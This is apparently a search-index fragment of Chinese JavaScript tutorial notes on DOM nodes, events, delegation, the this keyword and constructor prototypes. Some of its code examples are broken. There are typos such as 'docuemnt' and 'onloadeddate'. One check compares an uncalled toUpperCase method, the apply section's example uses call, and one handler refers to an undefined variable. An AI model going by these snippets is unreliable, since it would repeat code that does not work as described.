修改一个节点\",\"slug\":\"_3-4-4-修改一个节点\",\"contents\":[\"replaceChild：将页面中的某一个节点替换掉\",\"语法： 父节点.replaceChild(新节点，旧节点)\",\"<body> <div> <p>我是一个 p 标签</p> </div> <script> var oDiv = document.querySelector('div') var oP = oDiv.querySelector('p') // 创建一个 span 节点 var oSpan = document.createElement('span') // 向 span 元素中加点文字 oSpan.innerHTML = '我是新创建的 span 标签' // 用创建的 span 标签替换原先 div 下的 p 标签 oDiv.replaceChild(oSpan, oP) console.log(oDiv) /* <div> <span>我是新创建的 span 标签</span> </div> */ </script> </body> \"]},{\"header\":\"3.4.5 克隆一个节点\",\"slug\":\"_3-4-5-克隆一个节点\",\"contents\":[\"cloneNode：克隆一个已有的节点\",\"语法：元素.cloneNode(布尔值)\",\"cloneNode 会克隆出一个跟原标签一样的元素，括号内传入布尔值\",\"若为 true，则代表克隆时会包含后代节点一起克隆\",\"若为 false，则代表克隆时不包含后代节点\",\"默认为 false\"]},{\"header\":\"4. 对比DOM节点与元素\",\"slug\":\"_4-对比dom节点与元素\",\"contents\":[]},{\"header\":\"4.1 异同\",\"slug\":\"_4-1-异同\",\"contents\":[\"在JavaScript中，每一个HTML标签都可以看做一个节点（Node）。节点是DOM的基本单位，而元素（Element）是节点的一种，是节点类型之一。可以将元素称为节点的子类。\",\"元素节点是 DOM 树中的一个分支点，它包含元素标签的所有属性和内容。它也可以包含其他类型的节点，例如文本节点（Text）、注释节点（Comment）和其他元素节点（Element）。\",\"其他种类的节点还包括属性节点（Attribute Node）、文本节点（Text Node）、注释节点（Comment Node）等。这些节点类型并不是元素，但它们可以成为元素的一部分\",\"区别：\",\"元素节点是节点中的一种，而不是全部节点的总称。\",\"元素节点只有在包含标记字符的时候才存在，而其他节点没有该限制。\",\"节点有多种类型，元素节点就是其中之一。元素节点指的是HTML标签所表示的节点类型，它包含了属性和内容。\",\"联系：\",\"元素节点是节点的一种，它们都是DOM树的组成部分。\",\"元素节点也是 DOM 树中的一种分支点，包含了很多其他类型的节点。\",\"在DOM操作中，既可以操作元素节点，也可以操作其他类型的节点。\",\"总之，元素可以看作是节点的一种特殊情况，是DOM树结构的重要组成部分。它们的关系并不是对立的，而是相互联系的。在进行DOM操作时必须区别开它们的特点，选取特定的操作方法\"]},{\"header\":\"4.2 何时使用\",\"slug\":\"_4-2-何时使用\",\"contents\":[\"在JavaScript中，开发人员可以通过操作DOM树来实现对HTML或XML文档的访问和修改。一般来说，当开发人员需要访问或修改文档中的HTML或XML元素元素时，它们可以操作DOM中的节点而不是元素。下面是操作DOM元素和操作DOM节点的区别：\",\"操作DOM元素\",\"当开发人员需要通过操作文档的HTML或XML元素更新文档中的视觉效果时，就需要DOM元素来操作。比如需要改变元素的样式、更新元素的内容、或动态的向文档添加或移除元素等。但是，DOM元素并不只包含对元素直接的修改，也需要操纵元素的属性等相关内容\",\"操作DOM节点\",\"在有些情况下，开发人员需要访问或修改节点本身而不是元素。比如获取一个元素的父节点或子节点、访问文本节点、或创建自定义的节点等。当需要插入新的元素时，也需要操作节点，因为需要向DOM结构中插入新的节点\",\"因此，在开发过程中，要根据需求来操作DOM元素或节点，具体取决于需要进行哪些文档操作。一般的解决方案就是通过操作节点，来达到更新或操纵元素的目的。\",\"需要注意的是，由于操作DOM可能对应页面的重新计算和渲染，频繁操作DOM会影响整个页面的性能。所以建议在操作DOM时，尽可能地减少对DOM的访问，以达到最佳性能表现\"]},{\"header\":\"5. 事件\",\"slug\":\"_5-事件\",\"contents\":[\"事件是编程语言中的术语，它是用来描述程序的行为或状态的，一旦行为或状态发生改变，便立即调用一个函数\",\"一个事件由什么东西组成\",\"触发谁的事件：事件源\",\"触发什么事件：事件类型\",\"触发以后做什么：事件处理函数\",\"var oDiv = document.querySelector('div') oDiv.onclick = function () {} // 谁来触发事件 => oDiv => 这个事件的事件源就是 oDiv // 触发什么事件 => onclick => 这个事件类型就是 click // 触发之后做什么 => function () {} => 这个事件的处理函数 \",\"我们想要在点击 div 以后做什么事情，就把我们要做的事情写在事件处理函数里面\",\"var oDiv = document.querySelector('div') oDiv.onclick = function () { console.log('你点击了 div') } \",\"当我们点击 div 的时候，就会执行事件处理函数内部的代码，每点击一次，就会执行一次事件处理函数\"]},{\"header\":\"5.1 事件的绑定方式\",\"slug\":\"_5-1-事件的绑定方式\",\"contents\":[\"我们现在给一个注册事件都是使用 onxxx 的方式，但是这个方式不是很好，只能给一个元素注册一个事件，一旦写了第二个事件，那么第一个就被覆盖了\",\"oDiv.onclick = function () { console.log('我是第一个事件') } oDiv.onclick = function () { console.log('我是第二个事件') } \",\"当你点击的时候，只会执行第二个，第一个就没有了，我们还有一种事件监听的方式去给元素绑定事件\",\"使用 addEventListener 的方式添加，这个方法不兼容，在 IE 里面要使用 attachEvent\",\"addEventListener : 非 IE7、8 下使用\",\"语法： 元素.addEventListener('事件类型'， 事件处理函数， 是否使用捕获)\",\"这里的第三个参数是可选的，后面事件的传播会详述\",\"oDiv.addEventListener('click', function () { console.log('我是第一个事件') }, false) oDiv.addEventListener('click', function () { console.log('我是第二个事件') }, false) \",\"当你点击 div 的时候，两个函数都会执行，并且会按照你注册的顺序执行，先打印 我是第一个事件 再打印 我是第二个事件\",\"注意： 事件类型的时候不要写 on，点击事件就是 click，不是 onclick\",\"attachEvent ：IE 7 8 下使用\",\"语法： 元素.attachEvent('事件类型'， 事件处理函数)\",\"oDiv.attachEvent('onclick', function () { console.log('我是第一个事件') }) oDiv.attachEvent('onclick', function () { console.log('我是第二个事件') }) \",\"当你点击 div 的时候，两个函数都会执行，并且会按照你注册的顺序倒叙执行，先打印 我是第二个事件 再打印 我是第一个事件\",\"注意： 事件类型的时候要写 on，点击事件就写 onclick\",\"两个方式的区别：\",\"注册事件的时候事件类型参数的书写 \",\"addEventListener ： 不用写 on\",\"attachEvent ： 要写 on\",\"参数个数 \",\"addEventListener ： 一般是三个常用参数\",\"attachEvent ： 两个参数\",\"执行顺序 \",\"addEventListener ： 顺序注册，顺序执行\",\"attachEvent ： 顺序注册，倒叙执行\",\"适用浏览器 \",\"addEventListener ： 非 IE7、8 的浏览器\",\"attachEvent ： IE7、8 浏览器\"]},{\"header\":\"5.2 常见的事件类型\",\"slug\":\"_5-2-常见的事件类型\",\"contents\":[\"我们在写页面的时候经常用到的一些事件，大致分为几类，浏览器事件 、 鼠标事件 、 键盘事件 、 表单事件 、 触摸事件、焦点事件等\"]},{\"header\":\"5.2.1 浏览器事件\",\"slug\":\"_5-2-1-浏览器事件\",\"contents\":[\"load ： 页面全部资源加载完毕\",\"scroll ： 浏览器滚动的时候触发\",\"resize：窗口改变时触发\",\"DOMContentLoaded：当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，而无需等待样式表、图像等完全加载\",\"...\"]},{\"header\":\"5.2.2 鼠标事件\",\"slug\":\"_5-2-2-鼠标事件\",\"contents\":[\"click ：点击事件\",\"dblclick ：双击事件\",\"contextmenu ： 右键单击事件\",\"mousedown ：鼠标左键按下事件\",\"mouseup ：鼠标左键抬起事件\",\"mousemove ：鼠标移动\",\"mouseover ：鼠标移入事件，会有冒泡效果\",\"mouseout ：鼠标移出事件，会有冒泡效果\",\"mouseenter ：鼠标移入事件，没有冒泡效果\",\"mouseleave ：鼠标移出事件，没有冒泡效果\",\"...\"]},{\"header\":\"5.2.3 键盘事件\",\"slug\":\"_5-2-3-键盘事件\",\"contents\":[\"keyup ： 键盘抬起事件\",\"keydown ： 键盘按下事件\",\"keypress ： 键盘按下再抬起事件\",\"...\"]},{\"header\":\"5.2.4 表单事件\",\"slug\":\"_5-2-4-表单事件\",\"contents\":[\"change : 表单内容改变事件\",\"input : 表单内容输入事件\",\"submit : 表单提交事件\",\"...\"]},{\"header\":\"5.2.5 触摸事件\",\"slug\":\"_5-2-5-触摸事件\",\"contents\":[\"touchstart ： 触摸开始事件\",\"touchend ： 触摸结束事件\",\"touchmove ： 触摸移动事件\",\"...\"]},{\"header\":\"5.2.6 焦点事件\",\"slug\":\"_5-2-6-焦点事件\",\"contents\":[\"focus：获得焦点事件\",\"blur：失去焦点事件\"]},{\"header\":\"5.2.7 音视频事件\",\"slug\":\"_5-2-7-音视频事件\",\"contents\":[\"ontimeupdate 事件在视频或音频当前的播放位置发生改变时触发\",\"onloadeddate 事件在当前帧的数据加载完成且还没有足够的数据播放视频或音频的下一帧时触发\"]},{\"header\":\"5.3 事件对象\",\"slug\":\"_5-3-事件对象\",\"contents\":[\"什么是事件对象？就是当你触发了一个事件以后，对该事件的一些描述信息\",\"例如：\",\"你触发一个点击事件的时候，你点在哪个位置了，坐标是多少\",\"你触发一个键盘事件的时候，你按的是哪个按钮\",\"...\",\"每一个事件都会有一个对应的对象来描述这些信息，我们就把这个对象叫做 事件对象\",\"浏览器给了我们一个 黑盒子，叫做 window.event，就是对事件信息的所有描述，比如点击事件，你点在了 0，0 位置，那么你得到的这个事件对象里面对应的就会有这个点位的属性，你点在了 10, 10 位置，那么你得到的这个事件对象里面对应的就会有这个点位的属性\",\"oDiv.onclick = function () { console.log(window.event.X轴坐标点信息) console.log(window.event.Y轴坐标点信息) } \",\"这个玩意很好用，但是一般来说，好用的东西就会有 兼容性问题，在 IE低版本 里面这个东西好用，但是在 高版本IE 和 Chrome 里面不好使了，我们就得用另一种方式来获取 事件对象，在每一个事件处理函数的行参位置，默认第一个就是 事件对象\",\"oDiv.onclick = function (e) { // e 就是和 IE 的 window.event 一样的东西 console.log(e.X轴坐标点信息) console.log(e.Y轴坐标点信息) } \",\"综上所述，我们以后在每一个事件里面，想获取事件对象的时候，都用兼容写法\",\"oDiv.onclick = function (e) { e = e || window.event console.log(e.X轴坐标点信息) console.log(e.Y轴坐标点信息) } \",\"常用属性：\",\"type 当前事件的类型\",\"clientX/clientY 光标相对浏览器可见窗口左上角的位置\",\"offsetX/offsetY 光标相于当前 DOM 元素左上角的位置\",\"key 用户按下的键盘键的值，不提倡使用 keycode\"]},{\"header\":\"5.4 事件的传播\",\"slug\":\"_5-4-事件的传播\",\"contents\":[\"JavaScript-DOM02.png\",\"当元素触发一个事件的时候，其父元素也会触发相同的事件，父元素的父元素也会触发相同的事件，就像上面的图片一样，点击在红色盒子上的时候，会触发红色盒子的点击事件，也是点击在了粉色的盒子上，也会触发粉色盒子的点击事件，也是点击在了 body 上，也会触发 body 的点击事件，也是点击在了 html 上，也会触发 html 的点击事件，也是点击在了 document 上，也会触发 document 的点击事件，也是点击在了 window 上，也会触发 window 的点击事件，也就是说，页面上任何一个元素触发事件，都会一层一层最终导致 window 的相同事件触发，前提是各层级元素得有注册相同的事件，不然不会触发\",\"在事件传播的过程中，有一些注意的点：\",\"只会传播同类事件\",\"只会从点击元素开始按照 html 的结构逐层向上元素的事件会被触发\",\"内部元素不管有没有该事件，只要上层元素有该事件，那么上层元素的事件就会被触发\"]},{\"header\":\"5.4.1 冒泡、捕获、目标\",\"slug\":\"_5-4-1-冒泡、捕获、目标\",\"contents\":[\"我们刚才聊过了，每一个事件，都是有可能从自己到 window ，有可能要执行多个同类型事件，那么这个执行的顺序就有一些说法了\",\"目标：你是点击在哪个元素身上了，那么这个事件的 目标 就是什么\",\"冒泡：就是从事件 目标 的事件处理函数开始，依次向外，直到 window 的事件处理函数触发，也就是从下向上的执行事件处理函数\",\"捕获：就是从 window 的事件处理函数开始，依次向内，只要事件 目标 的事件处理函数执行，也就是从上向下的执行事件处理函数\",\"冒泡和捕获的区别：就是在事件的传播中，多个同类型事件处理函数的执行顺序不同\",\"addEventListener 第3个参数为 true 表示捕获阶段触发，false 表示冒泡阶段触发，默认值为 false\"]},{\"header\":\"5.5 事件委托\",\"slug\":\"_5-5-事件委托\",\"contents\":[\"事件委托利用了事件传播的特征来解决一些现实开发中的需求\",\"优点：减少注册次数，可以提高程序性能\",\"原理：事件委托其实是利用事件冒泡的特点 \",\"给父元素注册事件，当我们触发子元素的时候，会冒泡到父元素身上，从而触发父元素的事件\",\"实现：事件对象.target.tagName 可以获得真正触发事件的元素\"]},{\"header\":\"5.5.1 事件触发\",\"slug\":\"_5-5-1-事件触发\",\"contents\":[\"点击子元素的时候，不管子元素有没有点击事件，只要父元素有点击事件，那么就可以触发父元素的点击事件\",\"<body> <ul> <li>1</li> <li>2</li> <li>3</li> </ul> <script> var oUl = docuemnt.querySelector('ul') oUl.addEventListener('click', function (e) { console.log('我是 ul 的点击事件，我被触发了') }) </script> </body> \",\"像上面一段代码，当你点击 ul 的时候肯定会触发，但是当你点击 li 的时候，其实也会触发\"]},{\"header\":\"5.5.2 target\",\"slug\":\"_5-5-2-target\",\"contents\":[\"target 这个属性是事件对象里面的属性，表示你点击的目标，当你触发点击事件的时候，你点击在哪个元素上，target 就是哪个元素，这个 target 也不兼容，在 IE 下要使用 srcElement\",\"<body> <ul> <li>1</li> <li>2</li> <li>3</li> </ul> <script> var oUl = docuemnt.querySelector('ul') oUl.addEventListener('click', function (e) { e = e || window.event var target = e.target || e.srcElement console.log(target) }) </script> </body> \",\"上面的代码，当你点击 ul 的时候，target 就是 ul，当你点击在 li 上面的时候，target 就是 li\"]},{\"header\":\"5.5.3 委托\",\"slug\":\"_5-5-3-委托\",\"contents\":[\"这个时候，当我们点击 li 的时候，也可以触发 ul 的点事件，并且在事件内不，我们也可以拿到你点击的到底是 ul 还是 li，这个时候，我们就可以把 li 的事件委托给 ul 来做\",\"<body> <ul> <li>1</li> <li>2</li> <li>3</li> </ul> <script> var oUl = docuemnt.querySelector('ul') oUl.addEventListener('click', function (e) { e = e || window.event var target = e.target || e.srcElement // 判断你点击的是 li if (target.nodeName.toUpperCase === 'LI') { // 确定点击的是 li // 因为当你点击在 ul 上面的时候，nodeName 应该是 'UL' // 去做点击 li 的时候该做的事情了 console.log('我是 li，我被点击了') } }) </script> </body> \",\"上面的代码，我们就可以把 li 要做的事情委托给 ul 来做\"]},{\"header\":\"5.6 默认行为\",\"slug\":\"_5-6-默认行为\",\"contents\":[]},{\"header\":\"5.6.1 什么是默认行为\",\"slug\":\"_5-6-1-什么是默认行为\",\"contents\":[\"默认行为，就是不用我们注册，它自己就存在的事情，比如我们点击鼠标右键的时候，会自动弹出一个菜单，比如我们点击 a 标签的时候，我们不需要注册点击事件，他自己就会跳转页面...\",\"这些不需要我们注册就能实现的事情，我们叫做 默认行为\"]},{\"header\":\"5.6.2 阻止默认行为\",\"slug\":\"_5-6-2-阻止默认行为\",\"contents\":[\"有的时候，我们不希望浏览器执行默认事件，比如我给 a 标签绑定了一个点击事件，我点击你的时候希望你能告诉我你的地址是什么，而不是直接跳转链接，那么我们就要把 a 标签原先的默认事件阻止，不让他执行默认事件\",\"我们有两个方法来阻止默认事件\",\"e.preventDefault() : 非 IE 使用\",\"e.returnValue = false ：IE 使用\",\"我们阻止默认事件的时候也要写一个兼容的写法\",\"<a href=\\\"https://www.baidu.com\\\">点击我试试</a> <script> var oA = document.querySelector('a') a.addEventListener('click', function (e) { e = e || window.event console.log(this.href) e.preventDefault ? e.preventDefault() : e.returnValue = false }) </script> \",\"这样写完以后，你点击 a 标签的时候，就不会跳转链接了，而是会在控制台打印出 a 标签的 href 属性的值\"]},{\"header\":\"5.7 阻止冒泡\",\"slug\":\"_5-7-阻止冒泡\",\"contents\":[\"阻止冒泡是指阻断事件的流动，保证事件只在当前元素被执行，而不再去影响到其对应的祖先元素\",\"前提：阻止事件冒泡需要拿到事件对象\",\"语法：\",\"事件对象.stopPropagation() \",\"注意：此方法可以阻断事件流动传播，不光在冒泡阶段有效，捕获阶段也有效\",\"例：\",\"const father = document.querySelector('.father') const son = document.querySelector('.son') document.addEventListener('click', function () { alert('我是爷爷') }) father.addEventListener('click', function () { alert('我是爸爸') }) son.addEventListener('click', function (e) { alert('我是儿子') //阻止流动传播 e.stopPropagation() }) \"]},{\"header\":\"5.8 解绑事件\",\"slug\":\"_5-8-解绑事件\",\"contents\":[\"on 事件方式，直接使用 null 覆盖就可以实现事件的解绑\",\"例：\",\"//绑定事件 btn.onclick = function(){ alert('点击了') } //解绑事件 btn.onclick = null \",\"addEventListener 方式，必须使用：\",\"removeEventListener(事件类型,事件处理函数,[获取捕获或者冒泡阶段]) //[ ]内内容为可选的 \",\"例：\",\"function fn(){ alert('点击了') } //绑定了 btn.addEventListener('click',fn) //解绑事件 btn.removeEventListener('click',fn) \",\"注意：匿名函数无法被解绑\"]}]},\"/front-end/javascript-notes/21-JavaScript-this%E5%85%B3%E9%94%AE%E5%AD%97.html\":{\"title\":\"this关键字\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"每一个函数内部都有一个关键字是 this ，this用于访问当前方法的所属对象，可以让我们直接使用的\",\"重点： 函数内部的 this 只和函数的调用方式有关系，和函数的定义方式没有关系\"]},{\"header\":\"1. this指向\",\"slug\":\"_1-this指向\",\"contents\":[\"函数内部的 this 指向谁，取决于函数的调用方式（取决于函数被谁调用）\",\"全局定义的函数直接调用，this => window\",\"普通函数没有明确调用者时 this 值为 window，严格模式下没有调用者时 this 的值为 undefined\",\"function fn() { console.log(this) } fn() // 此时 this 指向 window \",\"对象内部的方法调用，this => 调用者\",\"var obj = { fn: function () { console.log(this) } } obj.fn() // 此时 this 指向 obj \",\"var obj = { } obj.fn = function () { console.log(this) } obj.fn() // 此时 this 指向 obj \",\"定时器的处理函数，this => window\",\"setTimeout(function () { console.log(this) }, 0) // 此时定时器处理函数里面的 this 指向 window \",\"事件处理函数，this => 事件源\",\"div.onclick = function () { console.log(this) } // 当你点击 div 的时候，this 指向 div \",\"自调用函数（立即执行函数），this => window\",\"(function () { console.log(this) })() // 此时 this 指向 window \"]},{\"header\":\"2. call 和 apply 和 bind\",\"slug\":\"_2-call-和-apply-和-bind\",\"contents\":[\"刚才我们说过的都是函数的基本调用方式里面的 this 指向，我们还有三个可以忽略函数本身的 this 指向转而指向别的地方，这三个方法就是 call 、 apply 、 bind，它们是强行改变 this 指向的方法\"]},{\"header\":\"2.1 call\",\"slug\":\"_2-1-call\",\"contents\":[\"call 方法是附加在函数调用后面使用，可以忽略函数本身的 this 指向\",\"语法： 函数名.call(要改变的 this 指向，要给函数传递的参数1，要给函数传递的参数2， ...)\",\"var obj = { name: 'Jack' } function fn(a, b) { console.log(this) console.log(a) console.log(b) } fn(1, 2) fn.call(obj, 1, 2) \",\"fn() 的时候，函数内部的 this 指向 window，fn.call(obj, 1, 2) 的时候，函数内部的 this 就指向了 obj 这个对象，使用 call 方法的时候会立即执行函数，第一个参数是你要改变的函数内部的 this 指向，第二个参数开始，依次是向函数传递参数\"]},{\"header\":\"2.2 apply\",\"slug\":\"_2-2-apply\",\"contents\":[\"apply 方法是附加在函数调用后面使用，可以忽略函数本身的 this 指向\",\"语法： 函数名.apply(要改变的 this 指向，[要给函数传递的参数1， 要给函数传递的参数2， ...])\",\"var obj = { name: 'Jack' } function fn(a, b) { console.log(this) console.log(a) console.log(b) } fn(1, 2) fn.call(obj, [1, 2]) \",\"fn() 的时候，函数内部的 this 指向 window，fn.apply(obj, [1, 2]) 的时候，函数内部的 this 就指向了 obj 这个对象，使用 apply 方法的时候，会立即执行函数，第一个参数是你要改变的函数内部的 this 指向，第二个参数是一个 数组，数组里面的每一项依次是向函数传递的参数\"]},{\"header\":\"2.3 bind\",\"slug\":\"_2-3-bind\",\"contents\":[\"bind 方法是附加在函数调用后面使用，可以忽略函数本身的 this 指向，和 call、apply 有一些不一样，就是不会立即执行函数，而是返回一个已经改变了 this 指向的函数\",\"语法： var newFn = 函数名.bind(要改变的 this 指向); newFn(传递参数)\",\"var obj = { name: 'Jack' } function fn(a, b) { console.log(this) console.log(a) console.log(b) } fn(1, 2) var newFn = fn.bind(obj) newFn(1, 2) \",\"bind 调用的时候，不会执行 fn 这个函数，而是返回一个新的函数，这个新的函数就是一个改变了 this 指向以后的 fn 函数，fn(1, 2) 的时候 this 指向 window，newFn(1, 2) 的时候执行的是一个和 fn 一摸一样的函数，只不过里面的 this 指向改成了 obj\"]}]},\"/front-end/javascript-notes/22-JavaScript-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B.html\":{\"title\":\"面向对象编程\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"首先，我们要明确，面向对象不是语法，是一个思想，是一种编程思想\"]},{\"header\":\"1. 编程思想\",\"slug\":\"_1-编程思想\",\"contents\":[]},{\"header\":\"1.1 面向过程\",\"slug\":\"_1-1-面向过程\",\"contents\":[\"面向过程就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候再一个一个的依次调用就可以了\",\"优点：性能比面向对象高，适合跟硬件联系很紧密的东西\",\"缺点：没有面向对象易维护、易复用、易扩展\"]},{\"header\":\"1.2 面向对象\",\"slug\":\"_1-2-面向对象\",\"contents\":[\"面向对象是把事务分解成为一个个对象，然后由对象之间分工与合作\",\"在面向对象程序开发思想中，每一个对象都是功能中心，具有明确分工\",\"面向对象编程具有灵活、代码可复用、容易维护和开发的优点，更适合多人合作的大型软件项目\",\"面向对象的特性：封装性、继承性、多态性\",\"优点：易维护、易复用、易扩展，由于面向对象有封装、继承、多态性的特性，可以设计出低耦合的系统，使系统更加灵活、更加易于维护\",\"缺点：性能比面向过程低\"]},{\"header\":\"2. 创建对象的方式\",\"slug\":\"_2-创建对象的方式\",\"contents\":[\"因为面向对象就是一个找到对象的过程，所以我们先要了解如何创建一个对象\"]},{\"header\":\"2.1 使用构造函数创建对象\",\"slug\":\"_2-1-使用构造函数创建对象\",\"contents\":[\"构造函数是专门用于创建对象的函数，如果一个函数使用 new 关键字调用，那么这个函数就是构造函数\",\"JS 给我们内置了一个 Object 构造函数，这个构造函数就是用来创造对象的，当构造函数和new 关键字连用的时候，就可以为我们创造出一个对象，因为 JS 是一个动态的语言，那么我们就可以动态的向对象中添加成员了\",\"// 就能得到一个空对象 var o1 = new Object() // 正常操作对象 o1.name = 'Jack' o1.age = 18 o1.gender = '男' \"]},{\"header\":\"2.2 使用字面量创建对象\",\"slug\":\"_2-2-使用字面量创建对象\",\"contents\":[\"直接使用字面量的形式，也就是直接写 {}，可以在写的时候就添加好成员，也可以动态的添加\",\"// 字面量方式创建对象 var o1 = { name: 'Jack', age: 18, gender: '男' } // 再来一个 var o2 = {} o2.name = 'Rose' o2.age = 20 o2.gender = '女' \"]},{\"header\":\"2.3 使用工厂函数创建对象\",\"slug\":\"_2-3-使用工厂函数创建对象\",\"contents\":[\"先书写一个工厂函数，这个工厂函数里面可以创造出一个对象，并且给对象添加一些属性，还能把对象返回\",\"使用这个工厂函数创造对象\",\"// 1. 先创建一个工厂函数 function createObj() { // 手动创建一个对象 var obj = new Object() // 手动的向对象中添加成员 obj.name = 'Jack' obj.age = 18 obj.gender = '男' // 手动返回一个对象 return obj } // 2. 使用这个工厂函数创建对象 var o1 = createObj() var o2 = createObj() \"]},{\"header\":\"2.4 使用自定义构造函数创建对象\",\"slug\":\"_2-4-使用自定义构造函数创建对象\",\"contents\":[\"工厂函数需要经历三个步骤：\",\"手动创建对象\",\"手动添加成员\",\"手动返回对象\",\"构造函数会比工厂函数简单一些：\",\"自动创建对象\",\"手动添加成员\",\"自动返回对象\",\"先书写一个构造函数，在构造函数内向对象添加一些成员，使用这个构造函数创造一个对象（和 new 连用），构造函数可以创建对象，并且创建一个带有属性和方法的对象\",\"面向对象就是要想办法找到一个有属性和方法的对象，面向对象就是我们自己制造 构造函数 的过程\",\"// 1. 先创造一个构造函数 function Person(name, gender) { this.age = 18 this.name = name this.gender = gender } // 2. 使用构造函数创建对象 var p1 = new Person('Jack', 'man') var p2 = new Person('Rose', 'woman') \"]},{\"header\":\"3. 构造函数详解\",\"slug\":\"_3-构造函数详解\",\"contents\":[\"我们了解了对象的创建方式，我们的面向对象就是要么能直接得到一个对象，要么就弄出一个能创造对象的东西，我们自己创造对象。我们的构造函数就能创造对象，所以接下来我们就详细聊聊构造函数\"]},{\"header\":\"3.1 构造函数的基本使用\",\"slug\":\"_3-1-构造函数的基本使用\",\"contents\":[\"和普通函数一样，只不过调用的时候要和 new 连用，不然就是一个普通函数调用\",\"function Person() {} var o1 = new Person() // 能得到一个空对象 var o2 = Person() // 什么也得不到，这个就是普通函数调用 \",\"注意：不写 new 的时候就是普通函数调用，没有创造对象的能力\",\"习惯将首字母大写\",\"function person() {} var o1 = new person() // 能得到一个对象 function Person() {} var o2 = new Person() // 能得到一个对象 \",\"注意： 首字母不大写，只要和 new 连用，就有创造对象的能力\",\"当调用的时候如果不需要传递参数可以不写 ()，建议都写上\",\"function Person() {} var o1 = new Person() // 能得到一个空对象 var o2 = new Person // 能得到一个空对象 \",\"注意： 如果不需要传递参数，那么可以不写 ()，如果传递参数就必须写\",\"构造函数内部的 this，由于和 new 连用的关系，是指向当前实例对象的\",\"function Person() { console.log(this) } var o1 = new Person() // 本次调用的时候，this => o1 var o2 = new Person() // 本次调用的时候，this => o2 \",\"注意： 每次 new 的时候，函数内部的 this 都是指向当前这次的实例化对象\",\"因为构造函数会自动返回一个对象，所以构造函数内部不要写 return\",\"你如果 return 一个基本数据类型，那么写了没有意义\",\"如果你 return 一个引用数据类型，那么构造函数本身的意义就没有了\"]},{\"header\":\"3.2 使用构造函数封装对象\",\"slug\":\"_3-2-使用构造函数封装对象\",\"contents\":[\"我们在使用构造函数的时候，可以通过一些代码和内容来向当前的对象中添加一些内容\",\"function Person() { this.name = 'Jack' this.age = 18 } var o1 = new Person() var o2 = new Person() \",\"我们得到的两个对象里面都有自己的成员 name 和 age，我们在写构造函数的时候，是不是也可以添加一些方法进去呢？\",\"function Person() { this.name = 'Jack' this.age = 18 this.sayHi = function () { console.log('hello constructor') } } var o1 = new Person() var o2 = new Person() \",\"显然是可以的，我们的到的两个对象中都有 sayHi 这个函数，也都可以正常调用，但是这样好不好呢？缺点在哪里？\",\"function Person() { this.name = 'Jack' this.age = 18 this.sayHi = function () { console.log('hello constructor') } } // 第一次 new 的时候， Person 这个函数要执行一遍 // 执行一遍就会创造一个新的函数，并且把函数地址赋值给 this.sayHi var o1 = new Person() // 第二次 new 的时候， Person 这个函数要执行一遍 // 执行一遍就会创造一个新的函数，并且把函数地址赋值给 this.sayHi var o2 = new Person() \",\"这样的话，那么我们两个对象内的 sayHi 函数就是一个代码一模一样，功能一模一样，但是是两个空间函数，占用两个内存空间，也就是说 o1.sayHi 是一个地址，o2.sayHi 是一个地址，所以我们执行 console.log(o1 === o2.sayHi) 的到的结果是 false\",\"缺点： 一模一样的函数出现了两次，占用了两个空间地址，存在内存浪费问题\",\"怎么解决这个问题呢？就需要用到一个东西，叫做原型\"]},{\"header\":\"4. 原型\",\"slug\":\"_4-原型\",\"contents\":[\"原型的出现，就是为了解决构造函数的缺点，也就是给我们提供了一个给对象添加函数的方法，不然构造函数只能给对象添加属性，不能合理的添加函数\"]},{\"header\":\"4.1 prototype\",\"slug\":\"_4-1-prototype\",\"contents\":[\"每一个函数天生自带一个成员，叫做 prototype，这个 prototype 属性可以由函数名来访问，它是一个对象，我们称为原型对象\",\"function Person() {} console.log(Person.prototype) // 是一个对象 \",\"即然是个对象，那么我们就可以向里面放入一些东西\",\"function Person() { // 此处未定义任何方法 } // 为构造函数的原型对象添加方法 Person.prototype.sayHi = function () { console.log('Hi~'); } var p1 = new Person(); p1.sayHi(); // 输出结果为 Hi~ \",\"我们发现了一个叫做 prototype 的对象是和函数有关联的，并且可以向里面存储一些东西\",\"重点： 在函数的 prototype 里面存储的内容，不是给函数使用的，是给函数的每一个实例化对象使用的\"]},{\"header\":\"4.2 __proto__\",\"slug\":\"_4-2-proto\",\"contents\":[\"每一个对象都天生自带一个成员，叫做 __proto__，是一个对象空间，我们称为对象原型，[[prototype]] 和 __proto__ 意义相同\",\"即然每一个对象都有，实例化对象也是对象，那么每一个实例化对象也有这个成员，这个 __proto__ 对象空间是给每一个对象使用的\",\"当你访问一个对象中的成员的时候\",\"如果这个对象自己本身有这个成员，那么就会直接给你结果\",\"如果没有，就会去 __proto__ 这个对象空间里面找，里面有的话就给你结果\",\"那么这个 __proto__ 又指向哪里呢？这个对象是由哪个构造函数 new 出来的，那么这个对象的 __proto__ 就指向这个构造函数的 prototype\",\"function Person() {} var p1 = new Person() console.log(p1.__proto__ === Person.prototype) // true \",\"我们发现实例化对象的 __proto__ 和所属的构造函数的 prototype 是一个对象空间，我们可以通过构造函数名称来向 prototype 中添加成员，对象在访问的时候自己没有，可以自动去自己的 __proto__ 中查找\",\"那么，我们之前构造函数的缺点就可以解决了：我们可以把函数放在构造函数的 prototype 中，实例化对象访问的时候，自己没有，就会自动去 __proto__ 中找，那么也可以使用了\",\"function Person() {} Person.prototype.sayHi = function () { console.log('hello Person') } var p1 = new Person() p1.sayHi() \",\"p1 自己没有 sayHi 方法，就会去自己的 __proto__ 中查找，p1.__proto__ 就是 Person.prototype，我们又向 Person.prototype 中添加了 sayHi 方法，所以 p1.sayHi 就可以执行了\",\"到这里，当我们实例化多个对象的时候，每个对象里面都没有方法，都是去所属的构造函数的 prototype 中查找，那么每一个对象使用的函数，其实都是同一个函数，那么就解决了我们构造函数的缺点\",\"function Person() {} Person.prototype.sayHi = function () { console.log('hello') } var p1 = new Person() var p2 = new Person() console.log(p1.sayHi === p2.sayHi) \",\"p1 是 Person 的一个实例，p2 是 Person 的一个实例，也就是说 p1.__proto__ 和 p2.__proto__ 指向的都是 Person.prototype，当 p1 去调用 sayHi 方法的时候是去 Person.prototype 中找，当 p2 去调用 sayHi 方法的时候是去 Person.prototype 中找，那么两个实例化对象就是找到的一个方法，也是执行的一个方法\",\"结论：当我们写构造函数的时候，属性我们直接写在构造函数体内，方法我们写在原型对象上\"]},{\"header\":\"4.3 